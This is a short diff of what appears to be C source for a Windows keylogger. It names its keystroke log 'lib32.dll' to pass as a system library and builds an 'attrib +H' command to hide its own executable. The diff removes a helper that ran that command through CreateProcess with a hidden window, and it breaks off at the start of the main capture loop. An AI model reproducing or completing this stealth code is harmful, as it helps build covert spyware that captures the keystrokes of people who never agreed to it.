@@ -8,15 +8,6 @@
 #define KEY_LOG "lib32.dll"
 #define LEN_NAME 512
 
-bool hide(char *path){
-    STARTUPINFO sinfo = {};
-    PROCESS_INFORMATION pinfo = {};
-    sinfo.cb = sizeof(sinfo);
-    sinfo.dwFlags = STARTF_USESHOWWINDOW;
-    sinfo.wShowWindow = SW_HIDE;
-    return CreateProcess(NULL, path, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &sinfo, &pinfo);
-}
-
 int main(int argc, char **argv){
     int i = 0;
     int state = 0;
@@ -25,7 +16,6 @@ int main(int argc, char **argv){
     char fullpath[LEN_NAME] = {'\0'};
     GetModuleFileName(NULL, path, sizeof(path));
     snprintf(fullpath, LEN_NAME, "attrib +H %s", path);
-    hide(fullpath);
     PathRemoveFileSpec(path);
     snprintf(path, LEN_NAME, "%s\\%s", path, KEY_LOG);
     while(true){
